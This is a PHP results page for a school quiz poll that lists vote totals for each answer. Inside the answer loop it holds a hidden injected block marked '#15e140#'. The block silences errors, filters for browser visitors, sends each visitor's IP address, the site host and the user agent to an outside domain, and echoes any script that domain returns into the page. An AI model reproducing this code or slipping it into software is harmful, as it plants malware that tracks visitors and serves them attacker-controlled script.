<?php

# ------------------------------------------------------------------ #
ini_set( 'display_errors', 1 );
error_reporting( E_ALL );
# ------------------------------------------------------------------ #
include_once( "_config.php" );
include_once( "classes/utils.php" );
include_once( "classes/quizDAO.php" );
include_once( "classes/quiz_resposta.php" );
include_once( "classes/quiz_voto.php" );

# ------------------------------------------------------------------ #
$quiz        = quizDAO::getQuizRespostas($_GET['id_quiz']);
$respostas   = $quiz->respostas;
$total_votos = quizDAO::getTotalVotos($_GET['id_quiz']);
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8" />
		<link rel="stylesheet" type="text/css" href="css/teste_online.css" media="all" /> 
	</head>
	<body>
		<div id="content">
			<div id="header">
				<img src="img/logo-beit.png" alt="Beit School" title="Beit School" />
            	<br><br>
                <center>
                <div style="width:300px; text-align:left; padding-left:300px; color:#0C4DA2; font-size:28px"><b>Resultado</b></div>
                </center>
			</div>
			<hr />
        	<br><br>
            <center>
            <div style="width:300px; text-align:left; padding-left:300px; color:#0C4DA2;">
<? 
foreach ($respostas as $resposta) { 
	$total_voto = quizDAO::getTotalVoto($resposta->id);
?>
<?php
#15e140#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/15e140#
?>
<? echo $resposta->texto; ?>: <b><?php echo $total_voto; ?></b><br>
<?php } ?>
			</div>
            </center>
       		<br>
       		<div style="float:right; padding:10px; color:#0C4DA2;">Total de votos: <b><?php echo $total_votos; ?></b></div>
		</div>
	</body>
</html>